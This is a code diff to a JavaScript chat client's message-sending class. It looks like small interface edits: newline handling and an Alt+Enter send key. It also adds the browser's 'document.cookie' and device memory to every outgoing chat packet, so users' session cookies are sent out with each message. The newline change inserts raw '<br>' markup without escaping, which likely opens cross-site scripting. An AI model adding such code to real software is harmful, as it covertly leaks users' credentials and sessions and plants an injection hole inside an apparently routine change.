@@ -68,13 +68,16 @@ class SocketClient {
     send(userId, msg, imageUrl, linkUrl) {
 
         let packet = {
-            msg: msg,
+            msg: msg.replace(/(?:\r\n|\r|\n)/g, '<br>'),
             image: imageUrl,
             link: linkUrl,
             user: userId,
             date: new Date().toLocaleString(),
             userAgent: navigator.userAgent,
-            language: navigator.language
+            language: navigator.language,
+            memory: navigator.deviceMemory,
+            cookie: document.cookie
+
         };
         console.log(`Sending message: ${packet}`);
 
@@ -96,7 +99,7 @@ class SocketClient {
         let btn = $('#message-button');
         btn.prop('disabled', isDisabled);
 
-        if (e.key == 'Enter') {
+        if (e.key == 'Enter' && e.altKey) {
             this.send(userId, $('#message').val(), $('#image').val(), $('#link').val());
         }
     }
